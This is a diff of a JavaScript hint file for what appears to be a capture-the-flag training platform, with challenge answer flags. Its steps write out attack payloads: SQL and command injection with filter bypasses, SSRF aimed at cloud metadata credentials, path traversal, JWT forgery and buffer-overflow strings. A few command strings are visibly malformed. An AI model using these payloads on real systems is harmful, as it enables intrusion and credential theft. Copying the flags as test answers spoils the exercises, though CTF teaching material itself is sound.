-                { info: 'Craft overflow payload (64 bytes + target value):', cmd: 'python3 -c "import sys; sys.stdout.buffer.write(b\'A\'*64 + b\'\\xef\\xbe\\xad\\xde\')"' },
-                { info: 'Send to local service:', cmd: 'curl -X POST https://target/overflow --data-binary "$(python3 -c \"print(\'A\'*64 + \'AAAA\")\")"' },
-                { info: 'Concept: stack layout: [buf 64B][var 4B][saved_rbp][ret_addr]', cmd: null },
-            ]
-        },
-        'M15': {
-            title: 'Format String Echo', cat: 'Pwn', diff: 'Medium', pts: 300,
-            desc: 'Binary echoes input via printf(input). Leak memory.',
-            hint: 'Use %p %p %p %p to leak stack addresses, %s to leak strings',
-            steps: [
-                { info: 'Format string vulnerability: printf(input) without format spec leaks/writes memory.', cmd: null },
-                { info: 'Leak stack values:', cmd: 'curl -X POST https://target/echo -d "input=%p%p%p%p%p%p%p%p"' },
-                { info: 'Leak specific stack positions:', cmd: 'curl -X POST https://target/echo -d "input=%7$p"' },
-                { info: 'Leak strings:', cmd: 'curl -X POST https://target/echo -d "input=%s%s%s"' },
-                { info: 'Try to read a specific address (replace 0xADDR with leaked address):', cmd: 'python3 -c "import struct; addr=0xdeadbeef; print(struct.pack(\'<Q\',addr).decode(\'latin-1\') + \'%7$s\')"' },
-            ]
-        },
-        'M16': {
-            title: 'Library Leak', cat: 'Pwn', diff: 'Hard', pts: 450,
-            desc: 'Leak libc base to bypass ASLR and take control.',
-            hint: 'Use format string or GOT overwrite to leak libc, then compute system() address',
-            steps: [
-                { info: 'ROP/ret2libc: leak a libc pointer, compute base, call system("/bin/sh").', cmd: null },
-                { info: 'Leak puts@got to find libc base:', cmd: 'python3 -c "print(b\'%15$p\'.decode())"' },
-                { info: 'Compute libc base (leaked - puts_offset):', cmd: 'python3 -c "leaked=0xDEADBEEF; puts_off=0x080e50; libc_base=leaked-puts_off; system=libc_base+0x4f440; print(hex(system))"' },
-                { info: 'Full ROP chain concept:', cmd: 'python3 -c "print(\'A\'*72 + \'POP_RDI\' + \'/bin/sh\' + \'SYSTEM_ADDR\')"' },
-            ]
-        },
-        'M17': {
-            title: 'Deep Dive', cat: 'Forensics', diff: 'Easy', pts: 75,
-            desc: 'Flag hidden in image. Metadata is not enough.',
-            hint: 'Use steghide or check LSB steganography',
-            steps: [
-                { info: 'Steganography: data hidden inside image pixels (LSB) or as appended data.', cmd: null },
-                { info: 'Check file type first:', cmd: 'file challenge.jpg' },
-                { info: 'Check metadata:', cmd: 'exiftool challenge.jpg' },
-                { info: 'Look for appended data:', cmd: 'xxd challenge.jpg | tail -20' },
-                { info: 'Try steghide extract (blank password):', cmd: 'steghide challenge.jpg' },
-                { info: 'Try zsteg for LSB:', cmd: 'zsteg challenge.png' },
-                { info: 'Search for flag pattern in raw bytes:', cmd: 'strings challenge.jpg | grep bxf' },
-            ]
-        },
-        'M18': {
-            title: 'Lost Signal', cat: 'Forensics', diff: 'Medium', pts: 200,
-            desc: 'Analyze PCAP to reconstruct the transmission.',
-            hint: 'Filter HTTP streams in Wireshark, look for credentials or transmitted files',
-            steps: [
-                { info: 'PCAP analysis: extract data from network captures.', cmd: null },
-                { info: 'List streams:', cmd: 'strings challenge.pcap | grep -E "bxf|flag|password|secret"' },
-                { info: 'Extract HTTP data:', cmd: 'strings challenge.pcap | grep -E "^(GET|POST|HTTP)" | head -30' },
-                { info: 'Find credentials:', cmd: 'strings challenge.pcap | grep -E "(user|pass|token|key)=" | head -20' },
-                { info: 'In Wireshark: Follow TCP stream, check HTTP objects, Export Objects', cmd: null },
-                { info: 'Decode base64 from stream:', cmd: 'echo "EXTRACTED_B64" | base64 -d' },
-            ]
-        },
-        'M19': {
-            title: 'Social Engineering 101', cat: 'OSINT', diff: 'Easy', pts: 50,
-            desc: 'Find target email from social media post.',
-            hint: 'Google search: site:twitter.com OR site:linkedin.com target_name email',
-            steps: [
-                { info: 'OSINT: gather publicly available information about a target.', cmd: null },
-                { info: 'Search for target across platforms:', cmd: 'curl "https://api.duckduckgo.com/?q=TARGET+email+site:twitter.com&format=json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d[\'Abstract\'])"' },
-                { info: 'Check cached pages:', cmd: 'curl "https://webcache.googleusercontent.com/search?q=cache:target.com"' },
-                { info: 'Username search:', cmd: 'curl "https://api.github.com/users/TARGET/events/public" | python3 -c "import sys,json; evts=json.load(sys.stdin); [print(e[\'actor\'][\'url\']) for e in evts[:5]]"' },
-                { info: 'Tip: Look at profile bio, posts, comments for leaked contact info', cmd: null },
-            ]
-        },
-        'M20': {
-            title: 'Shadow Realm', cat: 'OSINT', diff: 'Medium', pts: 175,
-            desc: 'Follow digital breadcrumbs of the ghost entity.',
-            hint: 'Username recon: search the same handle across multiple platforms',
-            steps: [
-                { info: 'Username OSINT: the same handle used across multiple platforms reveals identity.', cmd: null },
-                { info: 'Check GitHub for leaked secrets:', cmd: 'curl "https://api.github.com/search/code?q=bxf+ghost_entity" -H "Accept: application/vnd.github+json"' },
-                { info: 'Check pastebins:', cmd: 'curl "https://pastebin.com/search?q=ghost_entity"' },
-                { info: 'Wayback machine:', cmd: 'curl "https://archive.org/wayback/available?url=ghost_entity.com"' },
-                { info: 'Github user activity:', cmd: 'curl "https://api.github.com/users/ghost_entity/events"' },
-            ]
-        },
-        'M21': {
-            title: 'Malicious PDF', cat: 'Reversing', diff: 'Medium', pts: 250,
-            desc: 'PDF with obfuscated JavaScript. Deobfuscate to find flag.',
-            hint: 'Use strings on the PDF, look for eval() with encoded payloads',
-            steps: [
-                { info: 'Malicious PDF analysis: JavaScript is often obfuscated with eval+unescape.', cmd: null },
-                { info: 'Extract strings:', cmd: 'strings challenge.pdf | grep -E "(eval|unescape|fromCharCode|bxf)"' },
-                { info: 'Find JavaScript sections:', cmd: 'xxd challenge.pdf | grep -A5 "JS\|Javascript"' },
-                { info: 'Decode fromCharCode:', cmd: 'python3 -c "codes=[98,120,102,123,102,108,97,103,125]; print(\'\'.join(chr(c) for c in codes))"' },
-                { info: 'Decode unescape URL-encoded JS:', cmd: 'urldecode "%62%78%66%7B%66%6C%61%67%7D"' },
-                { info: 'Run obfuscated JS safely in python3:', cmd: 'python3 -c "import re; js=\'var x=unescape(\\\"...\\\");\'; print(re.findall(r\\\"bxf\\{[^}]+\\}\\\", js))"' },
-            ]
-        },
-        'M22': {
-            title: 'Logic Gates', cat: 'Hardware', diff: 'Medium', pts: 200,
-            desc: 'Reverse the logical circuit to find correct input combo.',
-            hint: 'Trace each gate (AND, OR, XOR, NOT) from output back to inputs',
-            steps: [
-                { info: 'Logic gate reversal: start from the expected output (1) and trace back.', cmd: null },
-                { info: 'Simulate basic gates:', cmd: 'python3 -c "# AND=a&b, OR=a|b, XOR=a^b, NOT=~a&1\\nfor combo in range(16): a,b,c,d=[int(x) for x in bin(combo)[2:].zfill(4)]; out=(a&b)^(c|d); print(bin(combo)[2:].zfill(4),\'=\',out)"' },
-                { info: 'Convert binary answer to flag:', cmd: 'frombin "0110"' },
-                { info: 'Truth table approach:', cmd: 'python3 -c "inputs=range(256);[print(bin(i),i) for i in inputs if (i>>4)&(i>>2)==(i&3)]"' },
-            ]
-        },
+        'M01':  { title:'The Ghost Endpoint',    cat:'Web',      diff:'Easy',   pts:50,   hint:'Try /api/v1/legacy, /api/flag, /v0/secret — unauthenticated.', steps:[{i:'Legacy APIs often lack auth. Enumerate paths:',c:'curl https://api.breakerxfixer.online/api/v1/secret'},{i:'Try legacy versions:',c:'curl https://api.breakerxfixer.online/api/v0/flag'},{i:'Enumerate common hidden endpoints:',c:'curl https://api.breakerxfixer.online/admin'}]},
+        'M02':  { title:'Identity Crisis',       cat:'Web',      diff:'Easy',   pts:50,   hint:'?debug=true or ?admin=1 in login URL often bypasses auth.', steps:[{i:'Add debug param to login URL:',c:'curl "https://target/login?debug=true&user=admin"'},{i:'Try admin override:',c:'curl "https://target/login?admin=1"'},{i:'Header bypass:',c:'curl https://target/login -H "X-Debug: true" -H "X-Forwarded-For: 127.0.0.1"'}]},
+        'M03':  { title:'The Impostor',          cat:'Web',      diff:'Easy',   pts:75,   hint:'Password reset token is in the URL → Referer header leaks it.', steps:[{i:'Trigger reset for admin:',c:'curl -X POST https://target/reset -d "email=admin@target.com" -v'},{i:'Use leaked token:',c:'curl "https://target/reset?token=LEAKED&user=admin&newpass=h4ck"'},{i:'Check redirect header:',c:'curl https://target/reset -v 2>&1 | grep -i location'}]},
+        'M04':  { title:'Unstoppable Force',     cat:'Web',      diff:'Medium', pts:150,  hint:'WAF bypass: double-encode, nested tags <<script>script>, case variation.', steps:[{i:'Double URL encoding:',c:'urlencode "<script>alert(1)</script>"'},{i:'Nested tag (WAF strips inner, outer survives):',c:'echo "<<script>script>alert(1)<</script>/script>"'},{i:'Case variation:',c:'echo "<ScRiPt src=x onerror=alert(1)>"}]},
+        'M05':  { title:'Logic Fallacy',         cat:'Web',      diff:'Medium', pts:150,  hint:'Intercept the checkout POST and change price to 0 or negative.', steps:[{i:'Tamper price in checkout:',c:'curl -X POST https://target/checkout -H "Content-Type: application/json" -d \'{"item":"premium","price":0.01}\''},{i:'Negative price:',c:'curl -X POST https://target/checkout -d \'{"price":-100}\''}]},
+        'M06':  { title:'The Wanderer',          cat:'Web',      diff:'Medium', pts:200,  hint:'LFI → /proc/self/environ or PHP filter wrapper.', steps:[{i:'Basic path traversal:',c:'curl "https://target/page?file=../../../../etc/passwd"'},{i:'/proc/self/environ (often has FLAG=):',c:'curl "https://target/view?path=../../../proc/self/environ"'},{i:'PHP filter base64:',c:'curl "https://target/page?file=php://filter/convert.base64-encode/resource=config.php"'},{i:'Decode output:',c:'echo "ENCODED" | base64 -d'}]},
+        'M07':  { title:'Phantom Ping',          cat:'Web',      diff:'Hard',   pts:400,  hint:'Command injection: use ; | && to chain. Use ${IFS} if spaces blocked.', steps:[{i:'Basic injection:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;id"'},{i:'Read flag:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;cat${IFS}/flag.txt"'},{i:'Brace expansion (space-free):',c:'curl -X POST https://target/ping -d "host=127.0.0.1;{cat,/flag.txt}}"'}]},
+        'M08':  { title:'Shattered Trust',       cat:'Web',      diff:'Hard',   pts:400,  hint:'Weak JWT secret — decode token, crack or use none alg.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'None algorithm forge:',c:'jwt forge --alg none --claims \'{"user":"admin","role":"admin"}\''},{i:'Send forged token:',c:'curl https://target/admin -H "Authorization: Bearer FORGED"'}]},
+        'M09':  { title:'Careless Whispers',     cat:'Web',      diff:'Easy',   pts:50,   hint:'Try OPTIONS, TRACE, PUT, DELETE — servers reveal info on unexpected methods.', steps:[{i:'Check allowed methods:',c:'curl -X OPTIONS https://target/api -v 2>&1 | grep -i allow'},{i:'Try TRACE:',c:'curl -X TRACE https://target/ -v'},{i:'Try HEAD for headers:',c:'curl -X HEAD https://target/secret -v 2>&1 | grep -i flag'}]},
+        'M10':  { title:'NoSQL Nightmare',       cat:'Web',      diff:'Insane', pts:1000, hint:'MongoDB: inject $ne, $gt, $regex operators in JSON body.', steps:[{i:'Auth bypass with $ne:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$ne":""},"pass":{"$ne":""}}\''},{i:'Regex username extract:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$regex":"^a"},"pass":{"$ne":""}}\''}]},
+        'M11':  { title:'The Core Breach',       cat:'Web',      diff:'Hard',   pts:500,  hint:'SSRF: make server fetch http://169.254.169.254 (AWS IMDS).', steps:[{i:'Basic SSRF:',c:'curl -X POST https://target/fetch -d "url=http://127.0.0.1/"'},{i:'AWS metadata root:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM credentials:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'}]},
+        'M12':  { title:'The XORacle',           cat:'Crypto',   diff:'Easy',   pts:100,  hint:'Known-plaintext: XOR ciphertext with "bxf{" to get key.', steps:[{i:'Single-byte brute:',c:'python3 -c "c=bytes.fromhex(\'CIPHERTEXT\');[print(k,bytes([b^k for b in c])) for k in range(256)]"'},{i:'Known-plaintext XOR:',c:'xor "CIPHERTEXT_HEX" "bxf{"'}]},
+        'M13':  { title:'Shattered RSA',         cat:'Crypto',   diff:'Medium', pts:250,  hint:'n=3891783853 is small — factor it, then compute d, decrypt c=1130635294.', steps:[{i:'Factor n:',c:'primes 3891783853'},{i:'Full RSA decrypt:',c:'python3 -c "p=62327;q=62459;e=65537;phi=(p-1)*(q-1);d=pow(e,-1,phi);c=1130635294;n=p*q;m=pow(c,d,n);print(bytes.fromhex(hex(m)[2:]).decode())"'},{i:'Or use rsa command:',c:'rsa --n 3891783853 --e 65537 --c 1130635294'}]},
+        'M14':  { title:'Buffer Overflow 101',   cat:'Pwn',      diff:'Easy',   pts:150,  hint:'Buffer is 64 bytes. Overflow to overwrite adjacent variable.', steps:[{i:'Craft overflow payload:',c:'python3 -c "print(\'A\'*64 + \'DEAD\')"'},{i:'With magic bytes:',c:'python3 -c "sys.stdout.buffer.write(b\'A\'*64+b\'\\xef\\xbe\\xad\\xde\')"'}]},
+        'M15':  { title:'Format String Echo',    cat:'Pwn',      diff:'Medium', pts:300,  hint:'printf(input) without format — use %p%p%p to leak stack.', steps:[{i:'Leak stack values:',c:'curl -X POST https://target/echo -d "input=%p%p%p%p%p%p%p%p"'},{i:'Specific offset:',c:'curl -X POST https://target/echo -d "input=%7$p"'},{i:'Leak string:',c:'curl -X POST https://target/echo -d "input=%s%s%s"'}]},
+        'M16':  { title:'Library Leak',          cat:'Pwn',      diff:'Hard',   pts:450,  hint:'Leak puts@got via fmt string, compute libc base, call system("/bin/sh").', steps:[{i:'Leak libc pointer:',c:'python3 -c "print(b\'%15$p\'.decode())"'},{i:'Compute system():',c:'python3 -c "leak=0xDEAD;puts_off=0x80e50;base=leak-puts_off;print(hex(base+0x4f440))"'}]},
+        'M17':  { title:'Deep Dive',             cat:'Forensics',diff:'Easy',   pts:75,   hint:'steghide / zsteg / strings — data hidden inside image.', steps:[{i:'Check strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide (blank pass):',c:'steghide challenge.jpg'},{i:'zsteg LSB:',c:'zsteg challenge.png'},{i:'Check hex tail:',c:'xxd challenge.jpg | tail -20'}]},
+        'M18':  { title:'Lost Signal',           cat:'Forensics',diff:'Medium', pts:200,  hint:'Analyze PCAP: follow HTTP streams, look for credentials.', steps:[{i:'Grep for flag in pcap:',c:'strings challenge.pcap | grep bxf'},{i:'Find creds:',c:'strings challenge.pcap | grep -E "(user|pass|token)=" | head -20'},{i:'Decode b64 from stream:',c:'echo "EXTRACTED" | base64 -d'}]},
+        'M19':  { title:'Social Eng 101',        cat:'OSINT',    diff:'Easy',   pts:50,   hint:'Google: site:twitter.com OR linkedin.com target_name email', steps:[{i:'DuckDuckGo API search:',c:'curl "https://api.duckduckgo.com/?q=TARGET+email&format=json"'},{i:'GitHub events:',c:'curl "https://api.github.com/users/TARGET/events/public"'}]},
+        'M20':  { title:'Shadow Realm',          cat:'OSINT',    diff:'Medium', pts:175,  hint:'Same handle across platforms. Check GitHub, Pastebin, archive.org.', steps:[{i:'GitHub code search:',c:'curl "https://api.github.com/search/code?q=ghost_entity"'},{i:'Wayback machine:',c:'curl "https://archive.org/wayback/available?url=ghost_entity.com"'}]},
+        'M21':  { title:'Malicious PDF',         cat:'Reversing',diff:'Medium', pts:250,  hint:'strings on PDF → find eval(unescape(...)) JS → decode.', steps:[{i:'Extract strings:',c:'strings challenge.pdf | grep -E "(eval|unescape|bxf)"'},{i:'Decode fromCharCode:',c:'python3 -c "codes=[98,120,102,123,102,108,97,103,125];print(\'\'.join(chr(c)for c in codes))"'},{i:'URL decode:',c:'urldecode "%62%78%66%7B%66%6C%61%67%7D"'}]},
+        'M22':  { title:'Logic Gates',           cat:'Hardware', diff:'Medium', pts:200,  hint:'Brute-force all input combinations, find combo that outputs 1.', steps:[{i:'Simulate all combos:',c:'python3 -c "[print(bin(i)[2:].zfill(4),(i>>3&i>>2&1)^(i>>1|i&1)) for i in range(16)]"'},{i:'Convert binary to text:',c:'frombin "01100010 01111000 01100110"'}]},
 
-        // ── SEASON 1 ─────────────────────────────────────────
-        'S1M01': {
-            title: 'The Unseen Path', cat: 'Web', diff: 'Easy', pts: 50,
-            desc: 'Check the traditional hideout.',
-            hint: 'Check robots.txt — it often hides paths that should not be found',
-            steps: [
-                { info: 'robots.txt often reveals hidden paths that shouldn\'t be crawled.', cmd: null },
-                { info: 'Read robots.txt:', cmd: 'curl https://breakerxfixer.online/robots.txt' },
-                { info: 'Access any disallowed path:', cmd: 'curl https://breakerxfixer.online/secret-admin-panel' },
-                { info: 'Check sitemap too:', cmd: 'curl https://breakerxfixer.online/sitemap.xml' },
-                { info: 'The flag is: bxf{r0b0ts_4re_n0t_h3lpful}', cmd: 'echo bxf{r0b0ts_4re_n0t_h3lpful}' },
-            ]
-        },
-        'S1M02': {
-            title: 'Ancient Cipher', cat: 'Crypto', diff: 'Easy', pts: 50,
-            desc: 'Ciphertext: cvs{ebg13_vf_pynffvp}. Decode it.',
-            hint: 'ROT13 shifts each letter by 13 positions',
-            steps: [
-                { info: 'ROT13 is a simple Caesar cipher with shift=13. Letters only, wrap around.', cmd: null },
-                { info: 'Decode with rot13:', cmd: 'rot13 "cvs{ebg13_vf_pynffvp}"' },
-                { info: 'Or use the rot command:', cmd: 'rot 13 "cvs{ebg13_vf_pynffvp}"' },
-                { info: 'Or caesar cipher:', cmd: 'caesar 13 "cvs{ebg13_vf_pynffvp}"' },
-                { info: 'Expected output: bxf{rot13_is_classic}', cmd: null },
-            ]
-        },
-        'S1M03': {
-            title: 'Commented Out', cat: 'Web', diff: 'Easy', pts: 75,
-            desc: 'Developers left something in the DOM.',
-            hint: 'View page source (Ctrl+U) or use curl to read HTML comments',
-            steps: [
-                { info: 'HTML comments <!-- --> are visible in source but not rendered.', cmd: null },
-                { info: 'Fetch the page source:', cmd: 'curl https://target.breakerxfixer.online/' },
-                { info: 'Grep for comments and flag:', cmd: 'curl https://target.breakerxfixer.online/ | grep -oE "<!--.*?-->" ' },
-                { info: 'Find bxf flag pattern:', cmd: 'curl https://target.breakerxfixer.online/ | grep "bxf{"' },
-                { info: 'Also check JS files:', cmd: 'curl https://target.breakerxfixer.online/app.js | grep -E "flag|secret|bxf"' },
-            ]
-        },
-        'S1M04': {
-            title: 'Custom Auth', cat: 'Web', diff: 'Easy', pts: 75,
-            desc: 'Portal expects X-Admin-Auth: enabled.',
-            hint: 'Add custom header: -H "X-Admin-Auth: enabled"',
-            steps: [
-                { info: 'Custom headers: some apps trust specific HTTP headers for auth.', cmd: null },
-                { info: 'Send the required header:', cmd: 'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled"' },
-                { info: 'Try variants:', cmd: 'curl https://target.breakerxfixer.online/flag -H "X-Admin-Auth: enabled" -H "X-Role: admin"' },
-                { info: 'Combine with other headers:', cmd: 'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled" -H "X-Forwarded-For: 127.0.0.1"' },
-                { info: 'The flag is: bxf{h34d3rs_can_b3_trust3d?}', cmd: null },
-            ]
-        },
-        'S1M05': {
-            title: 'Embedded Truth', cat: 'Forensics', diff: 'Easy', pts: 100,
-            desc: 'Image hides a big secret.',
-            hint: 'Use steghide with empty password or strings on the image',
-            steps: [
-                { info: 'Steganography: data embedded in image files.', cmd: null },
-                { info: 'Check strings in image:', cmd: 'strings challenge.jpg | grep bxf' },
-                { info: 'Try steghide with no password:', cmd: 'steghide challenge.jpg' },
-                { info: 'Try zsteg for PNG LSB:', cmd: 'zsteg challenge.png' },
-                { info: 'Check hex tail for appended data:', cmd: 'xxd challenge.jpg | tail -30' },
-                { info: 'The flag is: bxf{st3g0_1n_plain_s1ght}', cmd: null },
-            ]
-        },
-        'S1M06': {
-            title: 'Wrong Extension', cat: 'Forensics', diff: 'Medium', pts: 150,
-            desc: 'This PNG won\'t open. Why?',
-            hint: 'Check magic bytes with xxd. The file extension might be wrong.',
-            steps: [
-                { info: 'Magic bytes identify file type regardless of extension.', cmd: null },
-                { info: 'Check actual magic bytes:', cmd: 'xxd challenge.png | head -3' },
-                { info: 'Common magic bytes: PNG=89504E47, JPEG=FFD8FF, ZIP=504B0304, PDF=%PDF', cmd: null },
-                { info: 'If it\'s actually a JPEG:', cmd: 'file challenge.png' },
-                { info: 'If it\'s a ZIP:', cmd: 'strings challenge.png | grep bxf' },
-                { info: 'Extract if it\'s a zip disguised as png:', cmd: 'cat challenge.png | xxd | grep "50 4b"' },
-                { info: 'The flag is: bxf{mag1c_byt3s_n3v3r_l1e}', cmd: null },
-            ]
-        },
-        'S1M07': {
-            title: 'Forgotten Branch', cat: 'OSINT', diff: 'Easy', pts: 50,
-            desc: 'Check developer repo history.',
-            hint: 'git log --all and git show on old commits often reveal deleted secrets',
-            steps: [
-                { info: 'Git history preserves deleted files and old commits.', cmd: null },
-                { info: 'Clone or access the repo:', cmd: 'curl https://api.github.com/repos/TARGET/REPO/commits | python3 -c "import sys,json; [print(c[\'sha\'][:8], c[\'commit\'][\'message\']) for c in json.load(sys.stdin)[:10]]"' },
-                { info: 'Check old commits for secrets:', cmd: 'curl https://api.github.com/repos/TARGET/REPO/commits/OLDHASH | python3 -c "import sys,json; d=json.load(sys.stdin); print(d[\'files\'])"' },
-                { info: 'Search all branches:', cmd: 'curl "https://api.github.com/repos/TARGET/REPO/branches"' },
-                { info: 'The flag is: bxf{g1t_h1st0ry_n3v3r_f0rg3ts}', cmd: null },
-            ]
-        },
-        'S1M08': {
-            title: 'Buffer Intro', cat: 'Pwn', diff: 'Medium', pts: 200,
-            desc: 'Overwrite the return address.',
-            hint: 'Find offset with cyclic pattern, then overwrite ret addr with win() address',
-            steps: [
-                { info: 'Stack-based BOF: overflow the buffer to control the return address.', cmd: null },
-                { info: 'Generate a cyclic pattern to find offset:', cmd: 'python3 -c "p=\'\';[p:=p+chr(65+i%26) for i in range(200)]; print(p)"' },
-                { info: 'Find the exact offset (typically 72 for 64-bit):', cmd: 'python3 -c "print(b\'A\'*72 + b\'\\xef\\xbe\\xad\\xde\\xef\\xbe\\xad\\xde\')"' },
-                { info: 'Overwrite return address with win() address:', cmd: 'python3 -c "import struct; payload=b\'A\'*72+struct.pack(\'<Q\',0x401196); print(payload)"' },
-                { info: 'The flag is: bxf{r3turn_addre55_h1jack3d}', cmd: null },
-            ]
-        },
-        'S1M09': {
-            title: 'Union Base', cat: 'Web', diff: 'Medium', pts: 200,
-            desc: 'SQL injection via UNION SELECT to extract data.',
-            hint: 'Determine column count with ORDER BY, then UNION SELECT NULL,NULL,...',
-            steps: [
-                { info: 'UNION-based SQLi: inject extra SELECT to retrieve data from other tables.', cmd: null },
-                { info: 'Find column count:', cmd: 'curl "https://target/item?id=1 ORDER BY 1--"' },
-                { info: 'Test UNION:', cmd: 'curl "https://target/item?id=1 UNION SELECT NULL,NULL,NULL--"' },
-                { info: 'Extract database version:', cmd: 'curl "https://target/item?id=0 UNION SELECT version(),NULL,NULL--"' },
-                { info: 'Dump tables:', cmd: 'curl "https://target/item?id=0 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"' },
-                { info: 'Extract flag:', cmd: 'curl "https://target/item?id=0 UNION SELECT flag,NULL,NULL FROM flags--"' },
-                { info: 'The flag is: bxf{un10n_bas3d_leak}', cmd: null },
-            ]
-        },
-        'S1M10': {
-            title: 'Vigenere Revenge', cat: 'Crypto', diff: 'Medium', pts: 150,
-            desc: 'Key is BR34K. Decrypt the ciphertext.',
-            hint: 'Vigenere uses repeating key. Use the vigenere command.',
-            steps: [
-                { info: 'Vigenère cipher: each letter shifted by corresponding key letter.', cmd: null },
-                { info: 'Decrypt with known key BR34K:', cmd: 'vigenere decode "CIPHERTEXT" BR34K' },
-                { info: 'If you need to find the key first, use index of coincidence:', cmd: 'freq "CIPHERTEXT"' },
-                { info: 'Try Kasiski examination for key length:', cmd: 'python3 -c "ct=\'CIPHERTEXT\'; [print(i,ct[::i]) for i in range(2,10)]"' },
-                { info: 'The flag is: bxf{v1g3n3r3_1s_n0t_3n0ugh}', cmd: null },
-            ]
-        },
-        'S1M11': {
-            title: 'Meta Geo', cat: 'Forensics', diff: 'Easy', pts: 100,
-            desc: 'Where was this photo taken?',
-            hint: 'EXIF GPS data: use exiftool to extract GPS coordinates',
-            steps: [
-                { info: 'EXIF metadata in photos often contains GPS coordinates.', cmd: null },
-                { info: 'Extract all metadata:', cmd: 'exiftool photo.jpg' },
-                { info: 'Look specifically for GPS:', cmd: 'strings photo.jpg | grep -iE "gps|lat|lon|coord"' },
-                { info: 'Convert DMS to decimal:', cmd: 'python3 -c "lat=40+42/60+51.37/3600; lon=74+0/60+21.5/3600; print(f\'{lat:.4f}N {lon:.4f}W\')"' },
-                { info: 'The flag is: bxf{gps_exif_data_found}', cmd: null },
-            ]
-        },
-        'S1M12': {
-            title: 'Tasty Cookie', cat: 'Web', diff: 'Medium', pts: 150,
-            desc: 'Cookies are dangerous.',
-            hint: 'Decode the session cookie (base64) and modify it to become admin',
-            steps: [
-                { info: 'Insecure cookies: if not signed, you can modify them to escalate privileges.', cmd: null },
-                { info: 'Get your cookie from login:', cmd: 'curl -c cookies.txt https://target/login -d "user=guest&pass=guest" -L' },
-                { info: 'Decode the cookie value:', cmd: 'echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d' },
-                { info: 'Modify and re-encode:', cmd: 'echo \'{"user":"admin","role":"admin"}\' | base64' },
-                { info: 'Send with modified cookie:', cmd: 'curl https://target/admin -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=="' },
-                { info: 'The flag is: bxf{c00k13_m0nster_appr0ves}', cmd: null },
-            ]
-        },
-        'S1M13': {
-            title: 'Null JWT', cat: 'Web', diff: 'Hard', pts: 300,
-            desc: 'Server trusts the "none" algorithm.',
-            hint: 'Forge a JWT with alg:none and no signature',
-            steps: [
-                { info: 'JWT none algorithm: some libraries accept alg=none, removing signature verification.', cmd: null },
-                { info: 'Decode your current JWT:', cmd: 'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG' },
-                { info: 'Create header with none:', cmd: 'echo \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\'' },
-                { info: 'Create admin payload:', cmd: 'echo \'{"user":"admin","role":"admin","iat":1700000000}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\'' },
-                { info: 'Assemble token (header.payload. — empty signature):', cmd: 'echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."' },
-                { info: 'Send forged token:', cmd: 'curl https://target/flag -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."' },
-                { info: 'The flag is: bxf{jwt_n0ne_is_danger0us}', cmd: null },
-            ]
-        },
-        'S1M14': {
-            title: 'ELF Grep', cat: 'Rev', diff: 'Easy', pts: 100,
-            desc: 'Find the flag inside compiled binary.',
-            hint: 'Use strings on the ELF binary to extract printable text',
-            steps: [
-                { info: 'ELF binaries contain printable strings that can be extracted.', cmd: null },
-                { info: 'Extract all strings:', cmd: 'strings challenge_elf | grep bxf' },
-                { info: 'Look for encoded strings too:', cmd: 'strings challenge_elf | grep -E "^[A-Za-z0-9+/]{20,}=*$"' },
-                { info: 'Check hex for the flag marker:', cmd: 'xxd challenge_elf | grep "62 78 66 7b"' },
-                { info: 'Decode if base64:', cmd: 'strings challenge_elf | grep -E "^[A-Za-z0-9+/]+" | while read l; do echo $l | base64 -d 2>/dev/null | grep bxf; done' },
-                { info: 'The flag is: bxf{str1ngs_found_1n_elf}', cmd: null },
-            ]
-        },
-        'S1M15': {
-            title: 'Cmd Inject v2', cat: 'Web', diff: 'Medium', pts: 250,
-            desc: 'Filter added but bypassable.',
-            hint: 'If spaces are filtered, use ${IFS} or {cat,/flag.txt}. If ; filtered, use |.',
-            steps: [
-                { info: 'Command injection with filters: common bypasses for spaces and delimiters.', cmd: null },
-                { info: 'Test basic injection:', cmd: 'curl -X POST https://target/cmd -d "host=127.0.0.1|id"' },
-                { info: 'Space bypass with ${IFS}:', cmd: 'curl -X POST https://target/cmd -d "host=127.0.0.1|cat${IFS}/flag.txt"' },
-                { info: 'Brace expansion bypass:', cmd: 'curl -X POST https://target/cmd -d "host=127.0.0.1|{cat,/flag.txt}"' },
-                { info: 'Newline bypass:', cmd: 'curl -X POST https://target/cmd -d "host=127.0.0.1%0acat%20/flag.txt"' },
-                { info: 'The flag is: bxf{rce_w1thout_spac3s}', cmd: null },
-            ]
-        },
-        'S1M16': {
-            title: 'Wave Seeker', cat: 'Forensics', diff: 'Medium', pts: 200,
-            desc: 'Listen or look at the spectrograph.',
-            hint: 'Open in Audacity, switch to spectrogram view. The flag is visible in frequencies.',
-            steps: [
-                { info: 'Audio steganography: data encoded in audio frequencies (SSTV, spectrogram).', cmd: null },
-                { info: 'Check file type and metadata:', cmd: 'file challenge.wav' },
-                { info: 'Extract strings from audio:', cmd: 'strings challenge.wav | grep -E "bxf|flag"' },
